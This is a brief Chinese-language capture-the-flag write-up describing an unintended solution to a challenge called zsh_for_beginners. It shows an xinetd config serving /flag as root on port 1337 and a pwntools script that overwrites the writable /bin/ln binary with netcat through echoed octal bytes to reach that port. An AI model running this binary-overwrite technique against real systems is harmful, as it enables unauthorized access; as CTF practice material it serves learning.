    非预期解

    /bin/ln有rwx权限，看到zsh_for_beginners/share/xinetd

    service flag
{
        disable = no
        type = UNLISTED
        wait = no
        server = /bin/cat
        server_args = /flag
        socket_type = stream
        protocol = tcp
        user = root
        port = 1337
        flags = REUSE
        per_source = 5
        rlimit_cpu = 3
        nice = 18
}

    1337端口开了一个后门，当我们nc到1337即可得到flag。

    from pwn import *

exe = ''
host = '172.16.13.210'
port = 13378
conn = remote(host,port)


def write(content):
    conn.sendline('echo -en "{}" >> /bin/ln'.format(content))

file = open("nc",'rb')

all = file.read();

a = []

for i in all:
    a.append('\\'+str(oct(ord(i))))

b = [a[i:i+100] for i in range(0,len(a),100)]
conn.sendline('echo -en "" > /bin/ln')

for i in b:
    write(''.join(i))

    简单，直接echo写nc进去。即可得到flag。
